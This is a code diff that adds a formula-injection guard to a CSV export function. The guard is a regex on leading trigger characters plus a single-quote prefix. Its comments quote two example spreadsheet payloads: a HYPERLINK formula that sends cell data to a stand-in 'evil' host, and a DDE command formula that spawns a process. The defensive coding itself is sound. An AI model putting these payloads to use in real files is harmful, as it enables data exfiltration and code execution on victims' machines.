@@ -22,6 +22,25 @@
  * is non-empty so the file ends with a newline (matches
  * what most editors auto-insert).
  *
+ * OWASP CWE-1236 (CSV injection) guard (v0.10.0)
+ * =============================================
+ * A field whose first character is one of ``=``, ``+``,
+ * ``-``, ``@``, ``\t``, ``\r`` would be interpreted as a
+ * formula by Excel / Sheets when the analyst opens the file
+ * locally. A hostile ``name`` / ``skill_name`` /
+ * ``description`` uploaded as part of a ``.zevtc`` payload
+ * could therefore execute arbitrary formulas on the analyst's
+ * machine (e.g. ``=HYPERLINK("https://evil/?cookie="&A1,
+ * "Click")`` to exfiltrate cell contents; or ``=cmd|'/c
+ * calc'!A1`` to spawn a local process). The canonical
+ * defence (per the OWASP CWE-1236 mitigation guidance) is to
+ * prefix such values with a literal ``'`` (single quote) +
+ * wrap in double quotes per RFC 4180. The leading ``'`` is
+ * dropped on display by both Excel and Sheets, but the
+ * formula is no longer parsed. This guard is applied BEFORE
+ * the RFC 4180 escape check so the prefix holds even when the
+ * value contains no other escape-required character.
+ *
  * Browser download trigger
  * ========================
  * :func:`downloadCsv` wraps the CSV string in a ``Blob``,
@@ -31,6 +50,18 @@
  * external dependency (no ``file-saver`` / ``streamsaver``
  * needed for this small payload size).
  */
+
+/**
+ * Formula-injection guard regex (OWASP CWE-1236). Matches
+ * strings whose FIRST character is one of the 6 spreadsheet
+ * formula triggers (Excel / Sheets / LibreOffice all share
+ * the same trigger set). Anchored at the start so a value
+ * that happens to contain ``=`` later in the string is NOT
+ * flagged (the analyst's legitimate ``Player.42 = DPS 100``
+ * comment is safe; only an upload whose name literally starts
+ * with a trigger is the attack vector).
+ */
+const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;
 
 export interface CsvColumn<TRow> {
   /** Pydantic field name on the row model (e.g. ``"total_damage"``). */
@@ -78,15 +109,39 @@ export function toCsv<TRow>(
 }
 
 /**
- * Quote a single field per RFC 4180. ``null`` / ``undefined``
- * render as the empty string (so the column count stays
- * stable for sparse rows). Numbers and booleans are
- * stringified via ``String()``; everything else is coerced
- * to a string first.
+ * Quote a single field per RFC 4180 + apply the OWASP
+ * CWE-1236 formula-injection guard when the value starts
+ * with one of the 6 spreadsheet formula triggers (see
+ * the module docstring + :const:`FORMULA_TRIGGERS`).
+ *
+ * ``null`` / ``undefined`` render as the empty string (so
+ * the column count stays stable for sparse rows). Numbers
+ * and booleans are stringified via ``String()``; everything
+ * else is coerced to a string first.
+ *
+ * The 2 branches (formula-guard FIRST, RFC-4180 quote
+ * SECOND) handle 3 distinct escape shapes:
+ *
+ *   1. Formula trigger → ``'"' + "'" + value + '"'`` (always quoted)
+ *   2. RFC 4180 special char (``,``, ``"``, ``\r``, ``\n``)
+ *      → ``'"' + value (with ``"`` doubled) + '"'``
+ *   3. Safe char (alphanumeric + space) → unquoted
+ *
+ * The formula-guard branch MUST come first to ensure the
+ * leading single-quote prefix is preserved even when the
+ * value contains no other escape-required char.
  */
 function csvEscape(value: unknown): string {
   if (value === null || value === undefined) return "";
   const s = typeof value === "string" ? value : String(value);
+  if (FORMULA_TRIGGERS.test(s)) {
+    // Prefix with `'` (formula neutralizer) then wrap in
+    // double quotes + apply RFC 4180 internal-quote
+    // doubling to the raw value. The `'` sits immediately
+    // inside the opening double-quote so Excel drops it on
+    // display but the formula is no longer parsed.
+    return `"'${s.replace(/"/g, '""')}"`;
+  }
   if (/[",\r\n]/.test(s)) {
     return '"' + s.replace(/"/g, '""') + '"';
   }
